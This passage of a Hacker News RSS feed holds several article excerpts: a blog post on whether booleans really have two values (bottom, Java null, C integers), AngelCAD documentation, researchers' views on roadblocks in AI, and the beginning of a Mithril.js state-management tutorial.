has two values. They are <code>true</code> and <code>false</code> in Java, or <code>True</code> and <code>False</code>
in Haskell, and <code>1</code> and <code>0</code> in C. A boolean value is either true or false.</p>
<p>So, what’s there to think about? There are a few things, <em>ackshually</em>.
Let’s explore them, starting from the theoretical perspective.</p>
<h3 id="types-values-and-expressions">Types, Values, and Expressions</h3>
<p>Boolean, or <code>bool</code>, is a type. Broadly speaking, a type
is a property of <em>something</em> that defines what the <em>something</em>
means and what you can do with it. That <em>something</em> can be
several things; for our purposes, it can either be an
<em>expression</em> in a programming language (like those in the form <code>fact(n)</code>)
or a value in that same programming language (like <code>5</code>).</p>
<p>Dealing with values is rather simple. Most languages have finite numbers,
usually with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>32</mn></msup></mrow><annotation encoding="application/x-tex">2^{32}</annotation></semantics></math></span></span> values, which have type <code>int</code>,
<code>i32</code>, or something in a similar vein. Most languages also have
strings, of which there are as many as you have memory to contain,
and which have the type <code>string</code>, <code>String</code>, or occasionally
the more confusing <code>char*</code>. Most languages also have booleans,
as we discussed above.</p>
<p>The deal with expressions is a more interesting. Presumably
expressions evaluate to values, and the type of an expression
is then the type of values it can yield. Consider the following
snippet in C++:</p>
<div><pre><code data-lang="C"><span>int</span> <span>square</span><span>(</span><span>int</span> <span>x</span><span>)</span> <span>{</span>
    <span>return</span> <span>x</span> <span>*</span> <span>x</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>Here, the expression <code>x</code> is known to have type <code>int</code> from
the type signature provided by the user. Multiplication
of integers yields an integer, and so the type of <code>x*x</code> is also
of type <code>int</code>. Since <code>square(x)</code> returns <code>x*x</code>, it is also
of type <code>int</code>. So far, so good.</p>
<p>Okay, how about this:</p>
<div><pre><code data-lang="C++"><span>int</span> <span>meaningOfLife</span><span>()</span> <span>{</span>
    <span>return</span> <span>meaningOfLife</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>No, wait, doesn’t say “stack overflow” just yet. That’s no fun.
And anyway, this is technically a tail call, so maybe our
C++ compiler can avoid growing the stack. And indeed,
flicking on the <code>-O2</code> flag in this <a href="https://godbolt.org/z/9cv4nY">compiler explorer example</a>,
we can see that no stack growth is necessary: it’s just
an infinite loop. But <code>meaningOfLife</code> will never return a value. One could say
this computation <em>diverges</em>.</p>
<p>Well, if it diverges, just throw the expression out of the window! That’s
no <code>int</code>! We only want <em>real</em> <code>int</code>s!</p>
<p>And here, we can do that. But what about the following:</p>
<div><pre><code data-lang="C++"><span>inf_int</span> <span>collatz</span><span>(</span><span>inf_int</span> <span>x</span><span>)</span> <span>{</span>
    <span>if</span><span>(</span><span>x</span> <span>==</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
    <span>if</span><span>(</span><span>x</span> <span>%</span> <span>2</span> <span>==</span> <span>0</span><span>)</span> <span>return</span> <span>collatz</span><span>(</span><span>x</span><span>/</span><span>2</span><span>);</span>
    <span>return</span> <span>collatz</span><span>(</span><span>x</span> <span>*</span> <span>3</span> <span>+</span> <span>1</span><span>);</span>
<span>}</span>
</code></pre></div>
<p>Notice that I’ve used the fictitious type
<code>inf_int</code> to represent integers that can hold
arbitrarily large integer values, not just the 32-bit ones.
That is important for this example, and I’ll explain why shortly.</p>
<p>The code in the example is a simulation of the process described
in the <a href="https://en.wikipedia.org/wiki/Collatz_conjecture">Collatz conjecture</a>.
Given an input number <code>x</code>, if the number is even, it’s divided in half,
and the process continues with the halved number. If, on the other
hand, the number is odd, it’s multiplied by 3, 1 is added to it,
and the process continues with <em>that</em> number. The only way for the
process to terminate is for the computation to reach the value 1.</p>
<p>Why does this matter? Because as of right now, <strong>nobody knows</strong>
whether or not the process terminates for all possible input numbers.
We have a strong hunch that it does; we’ve checked a <strong>lot</strong>
of numbers and found that the process terminates for them.
This is why 32-bit integers are not truly sufficient for this example;
we know empirically that the function will terminate for them.</p>
<p>But why does <em>this</em> matter? Well, it matters because we don’t know
whether or not this function will diverge, and thus, we can’t
‘throw it out of the window’ like we wanted to with <code>meaningOfLife</code>!
In general, it’s <em>impossible to tell</em> whether or not a program will
terminate; that is the <a href="https://en.wikipedia.org/wiki/Halting_problem">halting problem</a>.
So, what do we do?</p>
<p>It turns out to be convenient – formally – to treat the result of a diverging computation
as its own value. This value is usually called ‘bottom’, and written as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>.
Since in most programming languages, you can write a nonterminating expression or
function of any type, this ‘bottom’ is included in <em>all</em> types. So in fact, the
possible values of <code>unsigned int</code> are <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo></mrow><annotation encoding="application/x-tex">\bot, 0, 1, 2, …</annotation></semantics></math></span></span> and so on.
As you may have by now guessed, the same is true for a boolean: we have <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>, <code>true</code>, and <code>false</code>.</p>
<h3 id="haskell-and-bottom">Haskell and Bottom</h3>
<p>You may be thinking:</p>
<blockquote>
<p>Now he’s done it; he’s gone off the deep end with all that programming language
theory. Tell me, Daniel, where the heck have you ever encountered <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span> in
code? This question was for a software engineering interview, after all!</p>
</blockquote>
<p>You’re right; I haven’t <em>specifically</em> seen the symbol <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span> in my time
programming. But I have frequently used an equivalent notation for the same idea:
<code>undefined</code>. In fact, here’s a possible definition of <code>undefined</code> in Haskell:</p>
<pre><code>undefined = undefined
</code></pre>
<p>Just like <code>meaningOfLife</code>, this is a divergent computation! What’s more is that
the type of this computation is, in Haskell, <code>a</code>. More explicitly – and retreating
to more mathematical notation – we can write this type as: <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mi mathvariant="normal">.</mi><mi>α</mi></mrow><annotation encoding="application/x-tex">\forall \alpha . \alpha</annotation></semantics></math></span></span>.
That is, for any type <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span></span>, <code>undefined</code> has that type! This means
<code>undefined</code> can take on <em>any</em> type, and so, we can write:</p>
<div><pre><code data-lang="Haskell"><span>myTrue</span> <span>::</span> <span>Bool</span>
<span>myTrue</span> <span>=</span> <span>True</span>

<span>myFalse</span> <span>::</span> <span>Bool</span>
<span>myFalse</span> <span>=</span> <span>False</span>

<span>myBool</span> <span>::</span> <span>Bool</span>
<span>myBool</span> <span>=</span> <span>undefined</span>
</code></pre></div>
<p>In Haskell, this is quite useful. For instance, if one’s in the middle
of writing a complicated function, and wants to check their work so far,
they can put ‘undefined’ for the part of the function they haven’t written.
They can then compile their program; the typechecker will find any mistakes
they’ve made so far, but, since the type of <code>undefined</code> can be <em>anything</em>,
that part of the program will be accepted without second thought.</p>
<p>The language Idris extends this practice with the idea of typed holes,
where you can leave fragments of your program unwritten, and ask the
compiler what kind of <em>thing</em> you need to write to fill that hole.</p>
<h3 id="java-and-null">Java and <code>null</code>
</h3>
<p>Now you may be thinking:</p>
<blockquote>
<p>This whole deal with Haskell’s <code>undefined</code> is beside the point; it doesn’t
really count as a value, since it’s just a nonterminating
expression. What you’re doing is a kind of academic autofellatio.</p>
</blockquote>
<p>Alright, I can accept this criticism. Perhaps just calling a nonterminating
function a value <em>is</em> far-fetched (even though in <a href="https://en.wikipedia.org/wiki/Denotational_semantics">denotational semantics</a>
we <em>do</em> extend types with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span></span>). But denotational semantics are not
the only place where types are implicitly extend with an extra value;
let’s look at Java.</p>
<p>In Java, we have <code>null</code>. At the
core language level, any function or method that accepts a class can also take <code>null</code>;
if <code>null</code> is not to that function or method’s liking, it has to
explicitly check for it using <code>if(x == null)</code>.</p>
<p>This <code>null</code> value does not at first interact with booleans.
After all, Java’s booleans are not classes. Unlike classes, which you have
to allocate using <code>new</code>, you can just throw around <code>true</code> and <code>false</code> as you see
fit. Also unlike classes, you simply can’t assign <code>null</code> to a boolean value.</p>
<p>The trouble is, the parts of Java dealing with <em>generics</em>, which allow you to write
polymorphic functions, can’t handle ‘primitives’ like <code>bool</code>. If you want to have an <code>ArrayList</code>
of something, that something <em>must</em> be a class.
But what if you really <em>do</em> want an <code>ArrayList</code> of booleans? Java solves this problem by introducing
‘boxed’ booleans: they’re primitives wrapped in a class, called <code>Boolean</code>. This class
can then be used for generics.</p>
<p>But see, this is where <code>null</code> has snuck in again. By allowing <code>Boolean</code> to be a class
(thereby granting it access to generics), we’ve also given it the ability to be null.
This example is made especially compelling because Java supports something
they call <a href="https://docs.oracle.com/javase/tutorial/java/data/autoboxing.html">autoboxing</a>:
you can directly assign a primitive to a variable of the corresponding boxed type.
Consider the example:</p>
<div><pre><code data-lang="Java"><span>Boolean</span> <span>myTrue</span> <span>=</span> <span>true</span><span>;</span>
<span>Boolean</span> <span>myFalse</span> <span>=</span> <span>false</span><span>;</span>
<span>Boolean</span> <span>myBool</span> <span>=</span> <span>null</span><span>;</span>
</code></pre></div>
<p>Beautiful, isn’t it? Better yet, unlike Haskell, where you can’t <em>really</em>
check if your <code>Bool</code> is <code>undefined</code> (because you can’t tell whether
a non-terminating computation is as such), you can very easily
check if your <code>Boolean</code> is <code>true</code>, <code>false</code>, or <code>null</code>:</p>
<div><pre><code data-lang="Java"><span>assert</span> <span>myTrue</span> <span>!=</span> <span>myFalse</span><span>;</span>
<span>assert</span> <span>myFalse</span> <span>!=</span> <span>myBool</span><span>;</span>
<span>assert</span> <span>myTrue</span> <span>!=</span> <span>myBool</span><span>;</span>
</code></pre></div>
<p>We’re okay to use <code>!=</code> here, instead of <code>equals</code>, because it so happens
each boxed instance of a <code>boolean</code> value
<a href="https://stackoverflow.com/questions/28636738/equality-of-boxed-boolean">refers to the same <code>Boolean</code> object</a>.
In fact, this means that a <code>Boolean</code> variable can have <strong>exactly</strong> 3 values!</p>
<h3 id="c-and-integers">C and Integers</h3>
<p>Oh the luxury of having a type representing booleans in your language!
It’s almost overly indulgent compared to the spartan minimalism of C.
In C, boolean conditions are represented as numbers. You can perhaps get
away with throwing around <code>char</code> or <code>short int</code>, but even then,
these types allow far more values than two!</p>
<div><pre><code data-lang="C"><span>unsigned</span> <span>char</span> <span>test</span> <span>=</span> <span>255</span><span>;</span>
<span>while</span><span>(</span><span>test</span><span>)</span> <span>test</span> <span>-=</span> <span>1</span><span>;</span>
</code></pre></div>
<p>This loop will run 255 times, thereby demonstrating
that C has at least 255 values that can be used
to represent the boolean <code>true</code>.</p>
<p>There are other languages
with this notion of ‘truthy’ and ‘falsey’ values, in which</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danilafe.com/blog/boolean_values/">https://danilafe.com/blog/boolean_values/</a></em></p>]]>
            </description>
            <link>https://danilafe.com/blog/boolean_values/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243211</guid>
            <pubDate>Sat, 22 Aug 2020 10:44:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AngelCAD: Script-based 3D solid modeller]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 61 (<a href="https://news.ycombinator.com/item?id=24243077">thread link</a>) | @app4soft
<br/>
August 22, 2020 | https://arnholm.github.io/angelcad-docs/ | <a href="https://web.archive.org/web/*/https://arnholm.github.io/angelcad-docs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        
        
        

        <p>AngelCAD - user documentation</p>

        
        <p><a href="https://github.com/arnholm/angelcad-docs">View the Project on GitHub <small>arnholm/angelcad-docs</small></a></p>
        

        

        
      </header>
      <section>

      <p><strong>AngelCAD - script based 3D solid modeller</strong></p>

<p>AngelCAD is a powerful open source 3D solid modeller based on the Constructive Solid Geometry (<a href="https://en.wikipedia.org/wiki/Constructive_solid_geometry">CSG</a>) modelling technique, expressed in the <a href="http://www.angelcode.com/angelscript/sdk/docs/manual/doc_script.html">AngelScript</a> language. The software creates 3D models in STL or other file formats.</p>



<p>The csg_wikipedia.as sample</p>

<table>
  <thead>
    <tr>
      <th>AngelCAD resources</th>
      <th>&nbsp;</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="http://www.angelcode.com/angelscript/sdk/docs/manual/doc_script.html" target="_blank">AngelScript language</a></td>
      <td>AngelScript language reference</td>
    </tr>
    <tr>
      <td><a href="https://arnholm.github.io/angelcad-docs/docs/annotated.html" target="_blank">AngelCAD language extension</a></td>
      <td>Language extension for 3d modelling</td>
    </tr>
    <tr>
      <td><a href="https://forum.abmesh.com/" target="_blank">AngelCAD user forum</a></td>
      <td>Discuss AngelCAD topics</td>
    </tr>
    <tr>
      <td><a href="https://github.com/arnholm/angelcad-samples" target="_blank">angelcad-samples</a></td>
      <td>Examples repository - GitHub</td>
    </tr>
    <tr>
      <td><a href="https://youtu.be/h-qDzG9bwnQ" target="_blank">Video</a></td>
      <td>script based 3D solid modeller</td>
    </tr>
    <tr>
      <td><a href="https://github.com/arnholm/angelcad/releases" target="_blank">Downloads</a></td>
      <td>Prebuilt binaries - Windows and Linux</td>
    </tr>
  </tbody>
</table>

<p>(links above open in new tabs)</p>

<p><strong>AngelCAD IDE and Viewer</strong> - With the desktop IDE you edit/run the scripts and launch the 3d Viewer</p>

<p><img src="https://arnholm.github.io/angelcad-docs/images/angelcad_ide.png" alt="AngelCAD modeller"></p>

<p><strong>Technology</strong> - AngelCAD uses <a href="https://github.com/arnholm/xcsg" target="_blank">xcsg</a> for 3d computations. xcsg is based on the <a href="https://github.com/arnholm/carve" target="_blank">carve library</a> by Tobias Sargeant. Also used is <a href="http://angusj.com/delphi/clipper.php">Clipper</a> by Angus Johnson, qhull by C.B. Barber and libtess2 by Mikko Mononen.</p>

<p>The AngelCAD language interpreter - as_csg - is based on the <a href="http://www.angelcode.com/angelscript/" target="_blank">AngelScript language</a> by Andreas Jönsson, as_csg extends the language with 3d modelling primitives and operations for constructive solid geometry.</p>

<p>The AngelCAD IDE and Viewer applications use the <a href="https://wxwidgets.org/" target="_blank">wxWidgets cross-platform GUI library</a> to create native GUI for Windows and Linux.</p>


      </section>
      
    </div></div>]]>
            </description>
            <link>https://arnholm.github.io/angelcad-docs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243077</guid>
            <pubDate>Sat, 22 Aug 2020 10:07:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experts Predict the Next Roadblocks in AI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243064">thread link</a>) | @mellosouls
<br/>
August 22, 2020 | https://blog.re-work.co/experts-explain-the-next-roadblocks-in-ai | <a href="https://web.archive.org/web/*/https://blog.re-work.co/experts-explain-the-next-roadblocks-in-ai">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.re-work.co/content/images/size/w300/2020/08/Copy-of-Blog-Pictures--13-.png 300w,
                            https://blog.re-work.co/content/images/size/w600/2020/08/Copy-of-Blog-Pictures--13-.png 600w,
                            https://blog.re-work.co/content/images/size/w1000/2020/08/Copy-of-Blog-Pictures--13-.png 1000w,
                            https://blog.re-work.co/content/images/size/w2000/2020/08/Copy-of-Blog-Pictures--13-.png 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://blog.re-work.co/content/images/size/w2000/2020/08/Copy-of-Blog-Pictures--13-.png" alt="Experts Predict The Next Roadblocks in AI">
</figure>
<section>
<div>
<p>Having asked our experts what their personal 'must-read' paper choice would be, we also wanted to find out their opinion on the current state of AI, with specific emphasis on the biggest roadblocks or barriers seen in the AI space, both now and in the future. </p><p>Didn't manage to catch our last experts blogs? You can see our experts must-read paper suggestions <a href="https://blog.re-work.co/ai-papers-suggested-by-experts/">part 1</a> and <a href="https://blog.re-work.co/must-read-ai-papers-suggested-by-experts-part-2/">part 2</a>. The below touches on the concerns around deepfakes, limited compute, model size and more. </p><h2 id="jane-wang-senior-research-scientist-deepmind"><strong><a href="https://www.linkedin.com/in/jane-wang-63167017/">Jane Wang</a>, Senior Research Scientist, DeepMind</strong></h2><p>I get worried that the societal implications and ethical consequences of the newest AI technologies are not being thought out as well as they should be. There's kind of this culture with researchers in the field right now of "let's just see what's possible," in spite of the possible negative ramifications. Some particularly worrying examples include facial recognition for surveillance, and generating increasingly realistic deepfakes. </p><p>There is recognition that this is an important issue, and some steps are being taken in that direction. For instance NeurIPS this year for the first time asked all submissions to come with a "broader impacts" section to comment on the wider societal implications of the work, and groups such as Partnership on AI have been formed specifically to tackle the problem of how to implement ethical and safe AI. But unfortunately I don't think that these kinds of perspectives are all that prevalent in the wider research community.</p><hr><h2 id="alexia-jolicoeur-martineau-phd-researcher-mila"><strong><a href="https://www.linkedin.com/in/alexiajm/">Alexia Jolicoeur-Martineau</a>, PhD Researcher, MILA</strong></h2><p>The biggest roadblock to generative modelling is 1) computing power, 2) the lack of long-term coherence, and 3) the lack of ability to understand what it doesn't know. Let's take a model that generates text and interacts with humans, such as GPT-2; it can say things that make sense and even answer hard questions correctly. However, if you ask nonsensical questions, it will try to give an answer rather than say "what you are asking doesn't make sense" or "I don't know". Furthermore, if you make it generate a large amount of text, there will be no long term coherence, it will go from one thing to another. If we wanted to make models that generate tv shows or movies, we would need a model that is coherent over time, which we don't have right now. Current AIs are really powerful, but still lack a true understanding of things. A lot more computing power will be needed if we ever want to generate high-resolution videos.</p><hr><h2 id="jekaterina-novikova-director-of-machine-learning-winterlight-labs"><strong><a href="https://www.linkedin.com/in/jnovikova/">Jekaterina Novikova</a>, Director of Machine Learning, WinterLight Labs</strong></h2><p>It is close to impossible to name one biggest roadblock in general AI. The term "artificial intelligence" does not have a concrete accepted definition. We can't agree on the definition of human intelligence, let alone the artificial one, and it's difficult to say what is blocking us from achieving something we can't even name. However, if we speak about narrow AI (AI which is able to handle just one particular task) then it is an umbrella of many different subtopics, such as Machine Learning, Robotics, Natural Language Processing etc. Each of those subtopics has their own specific roadblocks and challenges that should be overcome in order to make progress in AI research. In addition, when it comes to productionalization and real-life application of AI, non-research-specific roadblocks come into play that are related to AI implementation, adoption and scaling.<br></p><p>My current research is focused on Machine Learning in Healthcare, and here I see some common challenges researchers are constantly dealing with. I've recently gave a talk on real-life challenges in detecting cognitive diseases from human speech using ML (<a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">link to the slides</a>), where I mentioned several roadblocks, such as for example:</p><ul><li>Lack of relevant and appropriate data that is unbiased and does not compromise user privacy.</li><li>Limitations of English-only models. Most current developments in NLP are made in English and are not necessarily generalizable to non-English languages.</li><li>In the <a href="https://www.slideshare.net/JekaterinaNovikova1/solving-reallife-challenges-in-detecting-cognitive-diseases-from-speech-using-ml">slides</a>, I discuss more of the challenges and also present the research we are currently doing to overcome each of them.</li></ul><hr><h2 id="andriy-burkov-director-of-data-science-gartner"><strong><a href="https://www.linkedin.com/in/andriyburkov/">Andriy Burkov</a>, Director of Data Science, Gartner</strong></h2><p>If we talk about the narrow AI, the one we currently use in business, the biggest roadblock is the size of the models that provide the state of the art performance. The biggest Transformer ever trained, GPT-3, contains 175 billion parameters and costs millions of dollars to train. Only a handful of companies in the world can afford training such models and using them in production. If, in turn, the term AI is used in a more general sense, like artificial general intelligence (AGI), then the roadblock (and it's a huge one) is that we don't know exactly what science we need to develop to reach that level of machine intelligence. This is almost certainly not deep neural networks, as they are starting to reach their limits.</p><hr><h2 id="tamanna-haque-senior-data-scientist-at-jaguar-land-rover"><strong><a href="https://www.linkedin.com/in/tamannah1/">Tamanna Haque</a>, Senior Data Scientist at Jaguar Land Rover</strong></h2><p>Amongst stakeholders, business alignment on AI strategy relies on; a shared vision of effectively using data science to add business value, a mutual agenda on short and long-term business objectives and priorities, and clarity on which departments own or provide resource on different aspects of projects.</p><p>A lack of alignment creates challenges for data scientists who are tasked with opportunity scanning and delivering growth, cost-savings and value through analytics, with pressures heightened in the wake of negative economic impacts (the reality today). Between idea generation and delivery, data scientists aim to influence stakeholders to action and champion findings, but misalignment on AI strategy might effect apathy and put data scientists on the back foot to begin with.</p><p>Data scientists can build relationships with wider or cross-functional stakeholders to increase the likelihood of traction whilst increasing their knowledge of different business areas. They can also expand their network externally. A wide and diverse network keeps technical and commercial knowledge fresh whilst improving influence and communication skills- a practice which uses the help and expertise of others to enrich and get projects over the line.</p><hr><h2 id="oana-frunza-vice-president-nlp-and-ml-researcher-at-morgan-stanley"><strong><a href="https://www.linkedin.com/in/phd-oana-m-frunza-6bb3875/">Oana Frunza</a>, Vice President, NLP and ML Researcher at Morgan Stanley</strong></h2><p>Not necessarily a roadblock, but a direction we need to follow more is bridging the gap with other disciplines, especially the humanities. It is time to put <em>philosophy back in doctor of philosophy</em>. While we are good at building amazing technology, we need to start bringing in more knowledge from the world outside our disciplines to increase adoption and build trust. We will continue to advance and push forward the field, but we have to make sure that it is fit for the world around us and that the world around us is ready to adopt the solutions we build.</p><p>AI is a “gift of fire” – we must continue focusing on it enhancing our capabilities without getting burnt by the fire.</p><hr><h2 id="eric-charton-senior-director-ai-science-national-bank-of-canada"><strong><a href="https://www.linkedin.com/in/ericcharton/">Eric Charton</a>, Senior Director, AI Science, National Bank of Canada</strong></h2><p>Massive usage of (costly) computation power for minor improvement of performances is the elephant in the room. It is also difficult to have a clear view of the limitations of Deep Learning in various application context like unbalanced data (used in credit scoring), language models (dialog systems, question answering systems, text classification). What we see in mainstream publications is difficult to reproduce. We just begin to see some scientific communications with rigorous analysis of the pro and the cons of DL techniques.</p><hr><h2 id="jack-brzezinski-chief-ai-scientist-ai-systems-and-strategy-lab"><a href="https://www.linkedin.com/in/jack-brzezinski-a36245/">Jack Brzezinski</a>, Chief AI Scientist, AI Systems and Strategy Lab</h2><p>Since the inception of Artificial Intelligence there were periods of enthusiasm followed by "AI winters." Once you attempt to solve hard problems, unexpected roadblocks will appear. In a few cases, those problems were attacked head-on. Douglas Lenat's approach to building the CYC system (<a href="https://www.cyc.com/" rel="noopener">https://www.cyc.com</a>) is an example of such a frontal attack on the common sense reasoning problem, one of the hard ones in AI. In other cases, further research was necessary to move the needle in the right direction. Today, it is difficult to predict the single biggest issue that will be a roadblock. Elon Musk suggested that the interface between computers and the human brain needs a lot of improving. </p><p>His solution is to invent a more direct connection. Tom Mitchell from Carnegie Mellon suggests that machine learning algorithms should be in a state of continuous learning as opposed to a limited training phase carefully defined by the number of epochs. Perhaps, the biggest obstacle exists outside the high-tech field. Over the past decade, an enormous amount of investment was redirected from R&amp;D and used for stock buybacks and other financial operations. The legal environment often dictates the most optimal course of action for big corporations. It might take a new AI maverick similar to SpaceX in the aerospace area, to shift the focus from financial markets into research and development. Perhaps, another space race between superpowers will spark innovation. Artificial Intelligence, nuclear fusion, solid-state batteries, quantum computing, pharmaceutical research are only a few examples of many areas that are facing roadblocks.</p><hr><h2 id="abhishek-gupta-founder-montreal-ai-ethics-institute"><strong><a href="https://www.linkedin.com/in/abhishekguptamcgill/">Abhishek Gupta</a>, Founder, Montreal AI Ethics Institute</strong></h2><p>While there is emerging consensus on some of the fundamental principles as they relate to the ethics of AI, what is still starkly missing are operational guidelines for people to actually put these principles into practice. We need to have more discussions on moving from theory to practice and that requires people who have cross-domain expertise who are able to straddle both the fields of ethics and the technical domain of AI. Such individuals, especially the ones who are able to seamlessly integrate the findings from the fields will be essential in removing this roadblock.</p><hr><h2 id="jeff-clune-research-team-leader-openai"><a href="https://www.linkedin.com/in/jeff-clune-56403a26/">Jeff Clune</a>, Research Team Leader, OpenAI</h2><p>I had the pleasure of speaking with Jeff back in January. During his quick fire questions interview, he …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.re-work.co/experts-explain-the-next-roadblocks-in-ai">https://blog.re-work.co/experts-explain-the-next-roadblocks-in-ai</a></em></p>]]>
            </description>
            <link>https://blog.re-work.co/experts-explain-the-next-roadblocks-in-ai</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243064</guid>
            <pubDate>Sat, 22 Aug 2020 10:04:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple State Management in Mithril.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243040">thread link</a>) | @wilsonfiifi
<br/>
August 22, 2020 | https://kevinfiol.com/blog/simple-state-management-in-mithriljs/ | <a href="https://web.archive.org/web/*/https://kevinfiol.com/blog/simple-state-management-in-mithriljs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p><a href="https://mithril.js.org/">Mithril.js</a> is a lightweight JavaScript framework that has become a staple in my development stack after I discovered it two years ago. At the time, I was looking for a simpler, zero-dependency alternative to <a href="https://reactjs.org/">React.js</a> that could help me learn modern JavaScript UI development without needing to simultaneously learn and understand various build tools and framework plugins.</p>
<p>I've since learned React and have come to appreciate it for its influence on modern web development. However, I find that Mithril, a framework that sits at half the size of React whilst containing more features, has remained my go-to.</p>
<p>When it comes to state management, Mithril is as unopinionated as they come. You can use Redux, Mobx, Cerebral, some implementation of the SAM pattern, or best of all -- just a plain ol' JavaScript object! Mithril comes with an auto-redraw system. The virtual DOM created by Mithril will diff against and synchronize the DOM whenever changes are made to your data layer. Most commonly, the redraws are triggered after a DOM event.</p>
<p>What this means in practice is that you are free to structure your data however you'd like, and Mithril takes care of the rest. Below is an example of a simple Counter application written with Mithril:</p>
<pre><code><span>let</span> count <span>=</span> <span>0</span><span>;</span><p><span>const</span> Counter <span>=</span> <span>{</span><br>  <span>view</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span><br>    <span>m</span><span>(</span><span>'div'</span><span>,</span><br>      <span>m</span><span>(</span><span>'h1'</span><span>,</span> <span>'Counter'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'p'</span><span>,</span> count<span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>+=</span> <span>1</span> <span>}</span><span>,</span> <span>'+'</span><span>)</span><span>,</span><br>      <span>m</span><span>(</span><span>'button'</span><span>,</span> <span>{</span> <span>onclick</span><span>:</span> <span>(</span><span>)</span> <span>=&gt;</span> count <span>-=</span> <span>1</span> <span>}</span><span>,</span> <span>'-'</span><span>)</span><br>    <span>)</span><br><span>}</span><span>;</span></p><p>m<span>.</span><span>mount</span><span>(</span>document<span>.</span>body<span>,</span> Counter<span>)</span><span>;</span></p></code></pre>
<p><a href="https://flems.io/#0=N4IgZglgNgpgziAXAbVAOwIYFsZJAOgAsAXLKEAGhAGMB7NYmBvEAXwvW10QICsEqdBk2J5YxAAR0ArgwkBeCQAYA3AB00GoXEkBBAA76FE4BokSAbhBgB3RBIAUASgUA+M+YlYHAcgAmEBY+FB6eXr6EAIzBEj4AwrSyjABOPk4haGHm3j76MTIM6aGeOQBG0sTE9DHAEvTUUBDUANb2zm5SiXIA1IqREuyx3WkZWeE+5ZXVFCZ1aA1NrY4u8q6dSRIAtH0DMz6bacVOGqzqmmhY+FhdxA5+tNTSOAz4pbR+AJ4zBvpOKpQgOAwWDUYgQegIHiRABMiGhAA5NkpEEo2BwQJgcHh8NQ4AIaPRGMweGwALpURpoZqQ1AYrh4LAQYiEZLQAHSZLkHgkYj6OCIAD0Atk+maAHMcbQsALGczWVAAALQ-BKfAAZhlTJZ0CuEDQ+H4AOIH303EB1FZ+lErFJrCAA">Live Example</a></p>
<p>Our state is just a single primitive variable! For small applications, simple widgets or one-off UI components, the above solution is largely sufficient. What's important about implementing your state management solution is to understand that there is no silver bullet. You will be able to predict your needs more accurately as you work across multiple projects and grow organically. <a href="https://redux.js.org/">Redux</a> is a brilliant solution for modern UI state management, but the 9/10 times I have attempted to use it out of a desire to do things "the right way", it was absolute overkill. I advise reading <a href="https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367">this blog post</a> by Dan Abramov, the creator of Redux.</p>
<p>While the above solution is simple and likely sufficient for small use-cases, it introduces one problem - we are modifying the state directly from within the view. It won't take long before this approach proves unwieldy, and you're scanning your templates trying to find where you wrote the logic that is altering your state in (potentially) unpredictable ways.</p>
<p>We can introduce indirection and a more versatile state container using plain JavaScript objects. Our <code>Counter</code> component becomes more terse, yet more expressive:</p>
